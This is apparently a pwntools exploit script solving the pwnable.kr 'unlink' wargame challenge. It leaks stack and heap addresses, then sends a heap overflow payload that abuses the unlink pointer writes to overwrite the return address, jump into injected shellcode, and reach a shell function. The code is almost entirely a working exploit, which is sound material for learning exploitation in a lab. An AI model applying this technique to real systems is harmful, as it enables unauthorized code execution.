from pwn import *
logging.getLogger().setLevel(logging.DEBUG)

MODE = "debug"
SHELL_FUNC_ADDR = 0x080484eb

context.terminal = ["tmux", "splitw", "-h"]

if MODE == "debug":
    p = ELF("unlink").process()
    gdb.attach(p, gdbscript='''
    set follow-fork-mode child
    b unlink
    b *(unlink+38)
    continue
    ''')
else:
    p = ssh("pwnable.kr", 2222).process("unlink")

# Retrieve stack and heap addresses
addresses = p.recv().decode().splitlines()[:2]
stack_addr = int(addresses[0].split(": ")[1], base=16)
heap_addr = int(addresses[1].split(": ")[1], base=16)

logging.info(f"Stack Address {hex(stack_addr)}")
logging.info(f"Heap Address {hex(heap_addr)}")

###############################
###### Heap Overflow! #########
###############################
# Logic:
###############################
# We have the following assignments:
# -----------------------------------
# FD->bk = BK
# BK->fd = FD
# -----------------------------------
# So we can't have BK or FD containing a function address -> functions are not writable.
# We'll inject shellcode which will call the shell function, in the heap memory, which is wirtable.

# shellcode = asm(f"push {SHELL_FUNC_ADDR}; ret")
shellcode = asm(f"jmp short $+0x20")

# Calculating address in stack of the return address (PIE is disabled)
return_address = stack_addr - 0x18

logging.debug(f"Injected shellcode: {shellcode}")
logging.debug(f"Injected shellcode address: {hex(heap_addr + 8)}")
logging.debug(f"Address of return address in stack: {hex(return_address)}")

overflow_str = shellcode + \
    ("a" * (24 - len(shellcode))).encode() + \
    p32(heap_addr + 8) + \
    p32(return_address) + \
    asm(f"push {SHELL_FUNC_ADDR}; ret")

p.sendline(overflow_str)
p.interactive()
